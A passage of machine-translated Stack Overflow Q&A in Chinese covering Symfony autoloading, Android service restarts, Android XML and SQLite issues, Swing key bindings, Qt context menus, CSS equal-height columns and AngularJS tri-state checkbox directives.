Fatal error: Class 'Stof\DoctrineExtensionsBundle\StofDoctrineExtensionsBundle' not found in /www/gastlich_www/www/livescore.gastlich.iq.pl/app/AppKernel.php on line 24 
```

所以我假设，我对最后两个捆绑包只有问题：**StofDoctrineExtensionsBundle**和**DoctrineFixturesBundle**，它们在 composer.json 中有 dev-master 版本。在这一点上，我没有任何进一步的想法。我试图用谷歌搜索这个问题，但 90% 的问题与 Symfony 2.0 和移动 git 存储库有关；/

本地开发环境：PHP 5.4.6 Mysql 5.5.27 Apache 2.2.22 (Fedora)

我的服务器环境：PHP 5.4.6 MySql 5.0.32

任何帮助将不胜感激。

谢谢！

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2014-09-17T09:48:19.200

在更新/安装作曲家之前，您还需要将命令行环境设置为生产环境。

这里来自**官方 Symfony 文档**：

> 如果您在此步骤中收到“找不到类”错误，您可能需要`export SYMFONY_ENV=prod`在运行此命令之前运行，以便 post-install-cmd 脚本在 prod 环境中运行。

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2012-10-18T17:49:21.053

应用程序/自动加载.php

```
use Doctrine\Common\Annotations\AnnotationRegistry;

$loader = require __DIR__.'/../vendor/autoload.php';

// intl
if (!function_exists('intl_get_error_code')) {
    require_once __DIR__.'/../vendor/symfony/symfony/src/Symfony/Component/Locale/Resources/stubs/functions.php';

    $loader->add('', __DIR__.'/../vendor/symfony/symfony/src/Symfony/Component/Locale/Resources/stubs');
}

$loader->add('Stof\DoctrineExtensionsBundle', __DIR__.'/../vendor/stof/doctrine-extensions-bundle');
$loader->add('Gedmo' , __DIR__.'/../vendor/gedmo/doctrine-extensions/lib');

AnnotationRegistry::registerLoader(array($loader, 'loadClass'));

return $loader; 
```

# android - 即使我使用了 START_NOT_STICKY，为什么当进程被终止时我的 Android 服务会重新启动？

> ID：12648447
> 
> 赞同：56
> 
> 时间：2012-09-28T23:06:51.033
> 
> 标签：android, android-service

我的应用程序使用一种模式，我使用[Context#startService()启动服务并使用](http://developer.android.com/reference/android/content/Context.html#startService%28android.content.Intent%29)[Context#bindService()](http://developer.android.com/reference/android/content/Context.html#bindService%28android.content.Intent,%20android.content.ServiceConnection,%20int%29)绑定到它。这样我就可以独立于当前是否有任何客户端绑定到它来控制服务的生命周期。但是，我最近注意到，每当我的应用程序被系统杀死时，它很快就会重新启动所有正在运行的服务。此时将永远不会告诉服务停止，这会在发生时导致电池耗尽。这是一个最小的例子：

[我在这里](https://groups.google.com/forum/?fromgroups=#!topic/android-developers/x4pYZcXeKsw)找到了有类似问题的人，但从未诊断或解决。

服务：

```
@Override
public void onCreate() {
    Toast.makeText(this, "onCreate", Toast.LENGTH_LONG).show();
}

@Override
public int onStartCommand(Intent intent, int flags, int startId) {
    return START_NOT_STICKY;
}

@Override
public IBinder onBind(Intent intent) {
    return new Binder();
} 
```

活动：

```
@Override
protected void onStart() {
    super.onStart();
    Intent service = new Intent(this, BoundService.class);
    startService(service);
    bindService(service, mServiceConnection, 0);
}

@Override
protected void onStop() {
    unbindService(mServiceConnection);
    Toast.makeText(this, "unbindService", Toast.LENGTH_SHORT).show();
    super.onStop();
} 
```

为了测试它，我启动了应用程序，它启动了服务并绑定到它。然后我退出了应用程序，该应用程序解除绑定（但使服务保持运行）。然后我做了

```
$ adb shell am kill com.tavianator.servicerestart 
```

果然，5秒后，“onCreate”toast出现了，说明服务又启动了。Logcat 显示了这一点：

```
$ adb logcat | grep BoundService
W/ActivityManager(  306): Scheduling restart of crashed service com.tavianator.servicerestart/.BoundService in 5000ms
I/ActivityManager(  306): Start proc com.tavianator.servicerestart for service com.tavianator.servicerestart/.BoundService: pid=20900 uid=10096 gids={1028} 
```

如果我用 BIND_AUTO_CREATE 替换 startService() 模式，则不会发生问题（即使我在应用程序仍绑定到服务时崩溃）。如果我从不绑定到服务，它也可以工作。但是 start、bind 和 unbind 的组合似乎永远不会让我的服务死掉。

在杀死应用程序之前使用 dumpsys 显示：

```
$ adb shell dumpsys activity services com.tavianator.servicerestart
ACTIVITY MANAGER SERVICES (dumpsys activity services)
  Active services:
  * ServiceRecord{43099410 com.tavianator.servicerestart/.BoundService}
    intent={cmp=com.tavianator.servicerestart/.BoundService}
    packageName=com.tavianator.servicerestart
    processName=com.tavianator.servicerestart
    baseDir=/data/app/com.tavianator.servicerestart-2.apk
    dataDir=/data/data/com.tavianator.servicerestart
    app=ProcessRecord{424fb5c8 20473:com.tavianator.servicerestart/u0a96}
    createTime=-20s825ms lastActivity=-20s825ms
    executingStart=-5s0ms restartTime=-20s825ms
    startRequested=true stopIfKilled=true callStart=true lastStartId=1
    Bindings:
    * IntentBindRecord{42e5e7c0}:
      intent={cmp=com.tavianator.servicerestart/.BoundService}
      binder=android.os.BinderProxy@42aee778
      requested=true received=true hasBound=false doRebind=false 
```

* * *

## 回答 #1

> 赞同：31
> 
> 时间：2012-10-02T12:37:56.603

查看此[文档](http://android-developers.blogspot.com.au/2010/02/service-api-changes-starting-with.html)部分：服务生命周期更改（从 1.6 开始）

更新

经过一些调查（已创建项目、逐步运行描述的命令等），我发现代码的工作方式与“服务生命周期更改”中描述的完全一样

我发现了什么：**什么都没有**
`adb shell am kill com.tavianator.servicerestart`杀死（尝试，然后在 shell 中你将面临**错误**消息） **`adb shell``am kill com.tavianator.servicerestart`
**`Error: Unknown command: kill`****

 ****所以，
运行你的应用程序， 在 shell 运行命令中
运行`adb shell`
在 shell 运行`ps`命令 中
找到你的应用程序的 PID 号 你的 PID 号
在`kill <app_xx_PID>`
哪里
重复服务的杀戮步骤（如果它在自己的进程中运行）
检查服务是否正在运行（不应该） ，在 5-7 秒后重新启动
**更新**
一种解决方案（不够好，但在某些情况下可用）`stopSelf()`例如：

```
@Override
public int onStartCommand(Intent intent, int flags, int startId) {
    Toast.makeText(this, "onStartCommand", Toast.LENGTH_LONG).show();
    stopSelf();
    return START_NOT_STICKY;
} 
```

**更新**
更新的解决方案

```
void writeState(int state) {
    Editor editor = getSharedPreferences("serviceStart", MODE_MULTI_PROCESS)
            .edit();
    editor.clear();
    editor.putInt("normalStart", state);
    editor.commit();
}

int getState() {
    return getApplicationContext().getSharedPreferences("serviceStart",
            MODE_MULTI_PROCESS).getInt("normalStart", 1);
}

@Override
public int onStartCommand(Intent intent, int flags, int startId) {
    if (getState() == 0) {
        writeState(1);
        stopSelf();
    } else {
        writeState(0);
        Toast.makeText(this, "onStartCommand", Toast.LENGTH_LONG).show();
    }
    return START_NOT_STICKY;
} 
```

为什么进程被杀死时服务会重新启动？

根据这份[文件](http://developer.android.com/guide/components/services.html#Lifecycle)：

> 当服务启动时，它的生命周期独立于启动它的组件，并且服务可以无限期地在后台运行，即使启动它的组件被销毁也是如此。因此，**服务应该在其工作完成时通过调用 stopSelf() 自行**停止，或者另一个组件可以通过调用**stopService()**来停止它。
> **注意**：重要的是您的应用程序在完成工作后停止其服务，以避免浪费系统资源和消耗电池电量。如有必要，其他组件可以通过调用 stopService() 来停止服务。即使您为服务启用绑定，如果服务*收到*调用，您也必须自己停止服务*onStartCommand()*

从另一手文件说：

> *START_NOT_STICKY* - 如果系统在 onStartCommand() 返回后终止服务，请不要重新创建服务，除非有待交付的意图。这是最安全的选择，可以避免在不需要时运行服务，并且当您的应用程序可以简单地重新启动任何未完成的作业时。

因此，在阅读了本文档和一些实验之后，我认为系统将手动终止的服务视为未完成（崩溃：@see `W/ActivityManager(306): Scheduling restart of crashed service`）并重新启动它，尽管 onStartCommand 返回了值。

stopSelf() 或 stopService() -**不重新启动**，如果工作完成为什么不呢？

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2012-10-04T20:59:35.627

我相信这里的问题是，对于通过调用启动的服务，`startService()`其绑定的内部记帐（受对`bindService()`/的调用影响`unbindService()`）以某种方式阻止服务在进程被终止时计划重新启动后正确关闭.

根据您的喜好，似乎有三种选择可以避免这个问题（您在问题中已经提到了前两个）：

*   只使用`startService()`/ `stopService()`，根本不使用`bindService()`/ `unbindService()`。

*   仅使用`bindService()`/ `unbindService()`（和`BIND_AUTO_CREATE`），根本不要使用`startService()`/ `stopService()`。

*   如果您需要`startService()`/`stopService()` **和** `bindService()`/ `unbindService()`，请覆盖服务中的方法并从中[`onUnbind()`](http://developer.android.com/reference/android/app/Service.html#onUnbind%28android.content.Intent%29)调用：`stopSelf()`

    ```
    @Override
    public boolean onUnbind(Intent intent) {
        stopSelf();
        return super.onUnbind(intent);
    } 
    ```

根据我的测试：

*   使用第一种替代方法将在日志中打印此行：

    > W/ActivityManager(nnn)：计划在 5000 毫秒内重新启动崩溃的服务 xxxx

    但在那之后服务将不会真正重新启动。

*   第二种选择将导致您的服务在您解除绑定后被销毁（`onStop()`在您的示例中的 Activity 中）。

*   第三种选择基本上会让你的代码表现得像第二种选择（不需要做太多的改变）。

希望这可以帮助！

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-10-07T20:22:26.583

重新考虑你的**模式**怎么样？

START_NOT_STICKY 标志出现在 Android 演进过程中的某个时间点（1.6 之后？）。很可能，您正面临着当时引入的服务生命周期的一些微妙回归。因此，即使现在找到了同样微妙的解决方案——并且神奇地验证了它可以在所有可能的设备上运行——它也不一定能在新的 Android 版本下运行。

无论如何，这种生命周期模式看起来很不寻常，这可能就是您遇到这个奇异问题的原因。

让我们考虑两种情况。

1.  普通的 （？）。一些活动启动服务。不久之后，它被绑定、使用、解绑——然后呢？以某种方式停止？在这种情况下，为什么没有明显的电池消耗？

2.  异常。服务在某个（随机？）点被杀死。重新启动时，它实现了一些错误的假设并保持活动状态，做一些耗尽电池的事情？

这一切看起来都很奇怪。

我会分析您产品中的并发流程。所有重大案件。一些图表等。因此，很可能会消除对这种模式的需求。

否则，看起来任何解决方法都将是一个脆弱的黑客攻击。****

# android - 加载和查询大型xml文件Android

> ID：12648450
> 
> 赞同：3
> 
> 时间：2012-09-28T23:07:09.997
> 
> 标签：android, sax, xmlpullparser, xml

我正在构建一个 android 应用程序，我有一个 xml 文件，它是我的数据源，我加载它以使用 XPath 进行查询，然后将结果加载到 ListView 中。当 xml 文件开始变大（最大 10MB）时，问题就出现了。这意味着我可能有记忆问题，我猜。我想知道在不损害设备内存或浪费宝贵时间处理数据的情况下加载 xml 并对文件进行搜索的最佳方法是什么。

这是我加载 xml 文件时：

```
InputStream isRaw = context.getResources().openRawResource(R.raw.xmlbooksource);
_xmlBookSource = new InputSource(isRaw); 
```

在这里我使用 XPath 进行查询：

```
nodeResultSet = (NodeList) xpath.evaluate(xpathExpression, _xmlBookSource, XPathConstants.NODESET); 
```

欢迎所有建议。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-23T21:39:38.973

虽然它们可以用作数据源并且可以使用 XPath 进行搜索；XML 并不是真正为这些目的而制作的，它应该仅限于系统之间的数据传输。

如果您的数据源非常小，您应该认真考虑使用像 SQLite 这样的数据库来存储和查询您的数据。

# java - dbHelper.getWritableDatabase() 不起作用

> ID：12648451
> 
> 赞同：0
> 
> 时间：2012-09-28T23:07:11.693
> 
> 标签：java, android, database, android-contentprovider, sqliteopenhelper

我有一个自定义 ContentProvider，带有一个自定义成员 SQLiteDatabaseHelper 在尝试插入我的数据库时，在我的插入中，我实例化了我的 DatabaseHelper，然后我尝试在该实例上调用 getWritableDatabase() 以获取一个 SQLiteDatabase 对象，但我得到了一个强制关闭 getWritableDatabase() 调用。

我的活动：

```
public class UserForm extends Activity {
    public void onSubmitClick(View v){
        userDatabase db = new userDatabase();
        db.insert(userDatabase.CONTENT_URI, null);
    ...}
...} 
```

我的助手代码：

```
public static final class MainDatabaseHelper extends SQLiteOpenHelper{
    public MainDatabaseHelper(Context context) {            
        super(context, DBNAME, null, 1);
    }

    @Override
    public void onCreate(SQLiteDatabase db) {
        db.execSQL(SQL_CREATE_MAIN);

    }

    @Override
    public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
        db.execSQL("DROP TABLE IF EXISTS Users");
    }
} 
```

我的插入：

```
public class userDatabase extends ContentProvider {
     public Uri insert(Uri uri, ContentValues values) {
              MainDatabaseHelper dbHelper = new MainDatabaseHelper(getContext());
              SQLiteDatabase db = dbHelper.getWritableDatabase();
    ...}
...} 
```

我在最后一行得到了一个力量。

我知道 dbHelper 不为空。我知道 dbHelper 构造函数运行了。但是 dbHelper onCreate 从未运行过。

我的猜测是问题是助手被实例化但从未创建，可能有什么问题？

注意：我在没有内容提供者的情况下尝试了相同的过程，我的活动中没有助手，一切正常。然而，当我在内容提供者内部这样做时它不会......？

可能有什么问题？？？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-11-15T19:03:11.933

您不会在 Uri insert 方法中实例化数据库。插入应该如下所示：

```
 @Override
    public Uri insert(Uri uri, ContentValues values) {
        String tabela = "";
        Uri contentu;
        long rowID;
        switch (uriMatcher.match(uri)) {
            case uriCode2:
                tabela = TABLE_CLIENTI;
                contentu = CONTENT_URI_CLIENTI;
                break;
            case uriCode4:
                tabela = TABLE_UZERI;
                contentu = CONTENT_URI_UZERI;
                break;
            default:
                tabela = "";
                contentu = uri;
                throw new IllegalArgumentException("Unsupported URI: " + uri);
        }

        rowID = db.insert(tabela, "", values);
        if (rowID > 0) {
            Log.e(TAGU,"Notify change...");
            Uri _uri = ContentUris.withAppendedId(contentu, rowID);
            getContext().getContentResolver().notifyChange(_uri, null);
            return _uri;
        }
        throw new SQLException("Failed to add a record into " + uri);
    } 
```

其中 db 在 contentProvider 类声明之后立即声明，例如：

```
private SQLiteDatabase db; 
```

# java - JTextPane 和键盘输入

> ID：12648456
> 
> 赞同：2
> 
> 时间：2012-09-28T23:08:00.097
> 
> 标签：java, swing, netbeans, jscrollpane, jtextpane

我有一个有趣的问题。

我在 JScrollPane 中有一个 JTextPane ，其中填充了样式文本。文本从外部设备生成，然后传递给 StyledDocument（它看起来像一个终端窗口）。我使用按键监听器将输入的每个字符发送到设备，然后将字符从外部设备打印到文档中。这工作得很好！我不能更快乐！

除了！

当我按回车键或退格键时，会播放 Windows“boink”错误声音。当我按下回车键或退格键时，如何覆盖 JTextPane 以不播放“boink”声音？

谢谢！

关键监听器的当前代码

```
 addKeyListener(new KeyAdapter() {

        @Override
        public void keyTyped(KeyEvent ke) {
           //Absorb this action.
        }

        @Override
        public void keyReleased(KeyEvent ke) {
            //Absorb this action.
        }

        @Override
        public void keyPressed(KeyEvent evt) {

            char c = evt.getKeyChar();

            if (((byte) c) == 0x0A) {
                c = ((char) 0x0D);
            }

            try {
                rumIO.write(c);
            } catch (Exception e) {
            }
        }
    }); 
```

修复它的代码！

```
addKeyListener(new KeyAdapter() {
        @Override
        public void keyPressed(KeyEvent evt) {
            InputMap inputMap = getInputMap();
            ActionMap actionMap = getActionMap();
            KeyStroke keyStroke = KeyStroke.getKeyStrokeForEvent(evt);
            inputMap.put(keyStroke, "doNothing");
            actionMap.put("doNothing", new AbstractAction() {

                @Override
                public void actionPerformed(ActionEvent ae) {
                    //Do Nothing
                }
            });

            char c = evt.getKeyChar();

            if (((byte) c) == 0x0A) {
                c = ((char) 0x0D);
            }

            try {
                rumIO.write(c);
            } catch (Exception e) {
            }
        }
    }); 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-28T23:17:29.220

`JTextPane`使用[*键绑定*](http://docs.oracle.com/javase/tutorial/uiswing/misc/keybinding.html)。您可以覆盖[教程](http://docs.oracle.com/javase/tutorial/uiswing/misc/keybinding.html#howto)和本[示例](https://stackoverflow.com/a/12136312/230513)中所示的默认行为。

# qt - QMdiArea 不发出 customContextMenuRequested 信号

> ID：12648462
> 
> 赞同：0
> 
> 时间：2012-09-28T23:09:01.273
> 
> 标签：qt, qt4, contextmenu, qt4.8

我`QMdiArea`在主窗口中创建，然后我想右键单击 MDI 区域以获取弹出菜单。为此，我将以下代码放在主窗口的构造函数中。

```
this->ui->mdiArea->setContextMenuPolicy(Qt::CustomContextMenu);
connect(this->ui->mdiArea, SIGNAL(customContextMenuRequested(const QPoint&)), this, SLOT(slotRtClickContextMenu(const QPoint&))) 
```

ContextMenu 事件在我在 eventFilter 中检查时发生。

但是，当我单击 MDI 区域时没有任何响应。然后我`this->ui->mdiArea`用这个替换它，它运行良好并显示了弹出菜单。

有什么建议么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-06-13T14:23:35.237

我遇到了类似的问题，但使用 QTreeWidget。然后将 QtreeWidget->setContextMenuPolicy 的值设置为 Qt::CustomContextMenu 解决了这个问题。你可以试试同样的。

# html - DIV 与父级高度相同

> ID：12648464
> 
> 赞同：0
> 
> 时间：2012-09-28T23:09:14.197
> 
> 标签：html, css

所以，我有两个 DIV，因为第二个有可变内容。我需要第一个 DIV 与第二个 DIV 具有相同的高度，并且其上的文本垂直居中。我找到了几页类似的例子，但我还没有找到一个好的方法。提前致谢！

〜像这样：http: [//jsfiddle.net/a8LjU/4/](http://jsfiddle.net/a8LjU/4/)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T23:18:19.253

page.css：

```
<div class="container">
<div class="first">
  TEXT TEXT TEXT TEXT TEXT
</div>
<div class="second">
  TEXT TEXT TEXT TEXT TEXT TEXT TEXT TEXT TEXT TEXT         
</div>
</div>​ 
```

默认.css：

```
body{
  height:100%;
}
html{
  height:100%;
}

.container{
  float:left;
  height:100%;
}

.first, .second{
  float:left;
  background:#00C8FF;
  height:100%;
  width:50px;
}

.second{
  background:#006EFF;
} 
```

请记住，这会将两者的高度放在包含页面的高度。没有真正的好方法来做到这一点。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-28T23:24:10.313

`table`使用and的 css display 属性`table-cell`可以工作，但并非所有浏览器都支持，如 IE7 及以下。

我已经通过更改更新了您的示例：http: [//jsfiddle.net/a8LjU/5/](http://jsfiddle.net/a8LjU/5/)

另一种方法是使用中间 div，该方法可以在这里找到：http: [//matthewjamestaylor.com/blog/equal-height-columns-cross-browser-css-no-hacks](http://matthewjamestaylor.com/blog/equal-height-columns-cross-browser-css-no-hacks)

# javascript - 如何获得带有选择/取消选择所有功能和不确定值的 angular.js 复选框？

> ID：12648466
> 
> 赞同：27
> 
> 时间：2012-09-28T23:09:44.447
> 
> 标签：javascript, html, checkbox, angularjs, tri-state-logic

我正在寻找与[这些](http://jsfiddle.net/98BMK/)完全相同的东西（带有“父母”的三态复选框）。但是使用该解决方案并不优雅，因为我现在不依赖 jQuery，我需要调用 $scope.$apply 来让模型识别自动（未）选中的复选框 jQuery 点击。

[这是 angular.js 的一个错误，](https://github.com/angular/angular.js/issues/1411)它要求实现 ng-indeterminate-value。但这仍然不能让我与所有孩子同步，我认为这不应该是我的控制器的一部分。

我正在寻找的是这样的：

*   一个“ng-children-model”指令，语法如下：`<input type="checkbox" ng-children-model="child.isSelected for child in listelements">`. 将计算布尔值列表，如果选择 0 -> 复选框为 false。如果全部选中 -> 复选框为真。否则 -> 复选框不确定。
*   在我的控制器中，我会有这样的东西：`$scope.listelements = [{isSelected: true, desc: "Donkey"},{isSelected: false, desc: "Horse"}]`
*   复选框将像往常一样使用`<tr ng-repeat="elem in listelements"><td><input type="checkbox" ng-model="elem.isSelected"></td><td>{{elem.desc}}</td></tr>`.
*   据我了解，浏览器将确定单击的不确定复选框进入哪个状态。

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2013-02-10T22:20:53.723

我认为您提供的示例解决方案将太多代码放入控制器中。控制器应该只关心列表，HTML/指令应该处理显示（包括显示全选复选框）。此外，所有状态更改都是通过模型进行的，而不是通过编写函数。

我在 Plunker 上制定了一个解决方案：[http ://plnkr.co/edit/gSeQL6XPaMsNSnlXwgHt?p=preview](http://plnkr.co/edit/gSeQL6XPaMsNSnlXwgHt?p=preview)

现在，控制器只是设置列表：

```
app.controller('MainCtrl', function($scope) {
    $scope.list = [{
        isSelected: true,
        desc: "Donkey"
    }, {
        isSelected: false,
        desc: "Horse"
    }];
}); 
```

并且视图只是将它们呈现出来：

```
<div ng-repeat="elem in list">
  <input type="checkbox" ng-model="elem.isSelected" /> {{elem.desc}}
</div> 
```

对于 Select All 复选框，我创建了一个名为的新指令`checkbox-all`：

```
 <input checkbox-all="list.isSelected" /> Select All 
```

就使用而言，这就是它，希望它很简单......除了编写那个新指令：

```
app.directive('checkboxAll', function () {
  return function(scope, iElement, iAttrs) {
    var parts = iAttrs.checkboxAll.split('.');
    iElement.attr('type','checkbox');
    iElement.bind('change', function (evt) {
      scope.$apply(function () {
        var setValue = iElement.prop('checked');
        angular.forEach(scope.$eval(parts[0]), function (v) {
          v[parts[1]] = setValue;
        });
      });
    });
    scope.$watch(parts[0], function (newVal) {
      var hasTrue, hasFalse;
      angular.forEach(newVal, function (v) {
        if (v[parts[1]]) {
          hasTrue = true;
        } else {
          hasFalse = true;
        }
      });
      if (hasTrue && hasFalse) {
        iElement.attr('checked', false);
        iElement.addClass('greyed');
      } else {
        iElement.attr('checked', hasTrue);
        iElement.removeClass('greyed');
      }
    }, true);
  };
}); 
```

该`parts`变量将其分解为两部分，因此我可以从范围`list.isSelected`中获取 的值，即每个对象中的属性。`list``isSelected`

我将该`type="checkbox"`属性添加到输入元素，使其成为浏览器的真正复选框。这意味着用户可以点击它，标签到它等等。

我绑定`onchange`事件而不是`onclick`，因为可以通过多种方式更改复选框，包括通过键盘。onchange 事件在 a 中运行，`scope.$apply()`以确保模型更改在最后得到消化。

最后，我`$watch`将输入模型更改为复选框（最后一个`true`允许我查看复杂对象）。这意味着如果用户或其他原因更改了复选框，则 Select All 复选框始终保持同步。这比编写大量的 ng-click 处理程序要好得多。

如果复选框同时被选中和未选中，那么我将主复选框设置为未选中并添加样式“灰色”（请参阅​​ 参考资料`style.css`）。该 CSS 样式基本上将不透明度设置为 30%，导致复选框显示为灰色，但仍可点击；您也可以使用 Tab 键并使用空格键更改其值。

我已经在 Firefox、Chrome 和 Safari 中进行了测试，但我手头没有 IE。希望这对你有用。

* * *

## 回答 #2

> 赞同：20
> 
> 时间：2013-02-11T21:06:26.627

由于您需要一种新类型/类型的组件，因此这听起来像是自定义指令的好案例。
由于父/主/三态复选框和单独的双态复选框需要相互交互，我建议使用带有自己控制器的单个指令来处理逻辑。

```
<tri-state-checkbox checkboxes="listelements"></tri-state-checkbox> 
```

指示：

```
app.directive('triStateCheckbox', function() {
  return {
    replace: true,
    restrict: 'E',
    scope: { checkboxes: '=' },
    template: '<div><input type="checkbox" ng-model="master" ng-change="masterChange()">'
      + '<div ng-repeat="cb in checkboxes">'
      + '<input type="checkbox" ng-model="cb.isSelected" ng-change="cbChange()">{{cb.desc}}'
      + '</div>'
      + '</div>',
    controller: function($scope, $element) {
      $scope.masterChange = function() {
        if($scope.master) {
          angular.forEach($scope.checkboxes, function(cb, index){
            cb.isSelected = true;
          });
        } else {
          angular.forEach($scope.checkboxes, function(cb, index){
            cb.isSelected = false;
          });
        }
      };
      var masterCb = $element.children()[0];
      $scope.cbChange = function() {
        var allSet = true, allClear = true;
        angular.forEach($scope.checkboxes, function(cb, index){
          if(cb.isSelected) {
            allClear = false;
          } else {
            allSet = false;
          }
        });
        if(allSet)        { 
          $scope.master = true; 
          masterCb.indeterminate = false;
        }
        else if(allClear) { 
          $scope.master = false; 
          masterCb.indeterminate = false;
        }
        else { 
          $scope.master = false;
          masterCb.indeterminate = true;
        }
      };
      $scope.cbChange();  // initialize
    },
  };
}); 
```

更改模板以满足您的需要，或使用带有 templateUrl 的外部模板。

该指令假定 checkboxes 数组包含具有`isSelected`属性和`desc`属性的对象。

[笨蛋](http://plnkr.co/edit/N98IKTcHoZMCs18FjSRF?p=preview)。

**更新**：如果您希望指令只呈现三态复选框，因此各个复选框位于 HTML 中（如@Piran 的解决方案），这是[另一个 plunker](http://plnkr.co/edit/PTnzedhD6resVkApBE9K?p=preview)变体。对于这个 plunker，HTML 将是：

```
<tri-state-checkbox checkboxes="listelements" class="select-all-cb">
</tri-state-checkbox>select all
<div ng-repeat="item in listelements">
   <input type="checkbox" ng-model="item.isSelected"> {{item.desc}}
</div> 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2013-03-28T17:40:01.813

这是 Piran 解决方案的[改进版本](http://jsfiddle.net/wldaunfr/JSFLa/)。使用[`.prop()`](http://api.jquery.com/prop/)而不是`.attr()`解决`checked`问题。

用法：

```
<div ng-repeat="elem in list">
    <input type="checkbox" ng-model="elem.isSelected" /> {{elem.desc}}
</div>
<ui-select-all items="list" prop="isSelected"></ui-select-all> Select all 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-02-11T13:30:50.200

我相信，如果您只需要进行某种 DOM 操作或想要将大量 DOM 操作行为抽象为“可重用”组件，则应该只创建一个指令。

这是一个解决方案，可以实现与您尝试相同的事情，但是，这仅执行控制器中的逻辑...如果您想让控制器保持精简，那么您可以将所有这些逻辑推向服务...A如果您想在多个地方重复使用它，服务也是一个好地方。

[http://plnkr.co/edit/hNTeZ8Tuht3T9NuY7HRi?p=preview](http://plnkr.co/edit/hNTeZ8Tuht3T9NuY7HRi?p=preview)

请注意，控制器中没有 DOM 操作。我们正在使用 Angular 提供的一堆指令来实现我们需要的效果。不需要新指令..我真的不认为你应该使用指令来抽象逻辑..

希望这可以帮助..

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2015-03-30T02:13:01.083

如果你不能假设 ng-model 被分配给一个布尔模型（例如 Y/N、'0'/'1'）和/或你更喜欢有自己的标记，一种利用 ngModel 功能的方法，并使恕我直言，没有关于 HTML 结构更好的假设。

示例：[http ://plnkr.co/edit/mZQBizF72pxp4BvmNjmj?p=preview](http://plnkr.co/edit/mZQBizF72pxp4BvmNjmj?p=preview)

示例用法：

```
 <fieldset indeterminate-group>
    <legend>Checkbox Group</legend>
    <input type="checkbox" name="c0" indeterminate-cue> Todos <br>
    <input type="checkbox" name="c1" ng-model="data.c1" ng-true-value="'Y'" ng-false-value="'F'" indeterminate-item> Item 1 <br>
    <input type="checkbox" name="c2" ng-model="data.c2" ng-true-value="'Y'" ng-false-value="'F'" indeterminate-item> Item 2 <br>
    <input type="checkbox" name="c3" ng-model="data.c3" ng-true-value="'Y'" ng-false-value="'F'" indeterminate-item> Item 3 <br>
  </fieldset> 
```

指令（主要部分）：

```
angular.module('app', [])
  .directive('indeterminateGroup', function() {
    function IndeterminateGroupController() {
      this.items = [];
      this.cueElement = null;
    }
    ...
    function setAllValues(value) {
      if (this.inChangeEvent) return;

      this.inChangeEvent = true;
      try {
        this.items.forEach(function(item) {
          item.$setViewValue(value);
          item.$render();
        });
      } finally {
        this.inChangeEvent = false;
      }
    }

    return {
      restrict: "A",
      controller: IndeterminateGroupController,
      link: function(scope, element, attrs, ctrl) {
        ctrl.inputChanged = function() {
          var anyChecked = false;
          var anyUnchecked = false;
          this.items.forEach(function(item) {
            var value = item.$viewValue;
            if (value === true) {
              anyChecked = true;
            } else if (value === false) {
              anyUnchecked = true;
            }
          });

          if (this.cueElement) {
            this.cueElement.prop('indeterminate', anyChecked && anyUnchecked);
            this.cueElement.prop('checked', anyChecked && !anyUnchecked);
          }
        };
      }
    };
  })
  .directive('indeterminateCue', function() {
    return {
      restrict: "A",
      require: '^^indeterminateGroup',
      link: function(scope, element, attrs, indeterminateGroup) {
        indeterminateGroup.addCueElement(element);
        var inChangeEvent = false;
        element.on('change', function(event) {
          if (event.target.checked) {
            indeterminateGroup.checkAll();
          } else {
            indeterminateGroup.uncheckAll();
          }
        });
      }
    };
  })
  .directive('indeterminateItem', function() {
    return {
      restrict: "A",
      require: ['^^indeterminateGroup', 'ngModel'],
      link: function(scope, element, attrs, ctrls) {
        var indeterminateGroup = ctrls[0];
        var ngModel = ctrls[1];
        indeterminateGroup.addItem(ngModel);
        ngModel.$viewChangeListeners.push(function() {
          indeterminateGroup.inputChanged();
        });
      }
    };
  }); 
```

模型：

```
// Bring your own model 
```

去做：

*   摆脱主指令控制器中的 item.$render() ；
*   给指令起一个更好的名字；
*   使在多个表列中易于使用此指令。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-09-30T02:31:20.297

## **[普朗克](http://plnkr.co/edit/naSJR73pDaV7tYCApYt9?p=preview)**

```
"use strict";

var module = angular.module("myapp", []);

function Ctrl($scope) {
    var element = $("#select_all");
    $scope.$watch("$scope.isgreyed", $scope.fun = function() {
        element.prop("indeterminate", $scope.isgreyed);
    });
    $scope.list = [{
        isSelected: true,
        desc: "Donkey"
    }, {
        isSelected: false,
        desc: "Horse"
    }]
    $scope.isgreyed = true;
    $scope.master = false;
    $scope.onmasterclick = function() {
        $scope.list.map(function(v) {
            v.isSelected = $scope.master
        })
    }

    $scope.oncheckboxclick = function() {     
        if ($('.select_one:checked').length === 0) {
            $scope.isgreyed = false;
            $scope.master = false;     
        } else if ($('.select_one:not(:checked)').length === 0) {
            $scope.isgreyed = false;
            $scope.master = true;     
        } else {
            $scope.isgreyed = true;     
        }
        $scope.fun();
    }      
} 
```

HTML：

```
<div ng-controller="Ctrl">
<table>
<tr>
  <td>
     <input type="checkbox" id="select_all" ng-model="master" ng-click="onmasterclick()">
  </td>
</tr>
<tr ng-repeat="elem in list">
  <td>
    <input ng-click="oncheckboxclick(elem)" class="select_one" type="checkbox" ng-model="elem.isSelected">
  </td>
  <td>{{elem.desc}}</td>
</tr>
</table>
</div> 
```

是的，它很丑。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2013-11-20T12:29:09.967

使用[Plnker](http://plnkr.co/edit/ykVyOufCq5mwVTP94PU5?p=preview)重写为更好的代码，而不需要消耗资源的 ForEach 和其他一些复杂的东西：

```
var app = angular.module('angularjs-starter', []);

app.controller('MainCtrl', function($scope) {
  $scope.listelements = [{
    isSelected: true,
    desc: "Donkey"
  }, {
    isSelected: false,
    desc: "Horse"
  }];
});

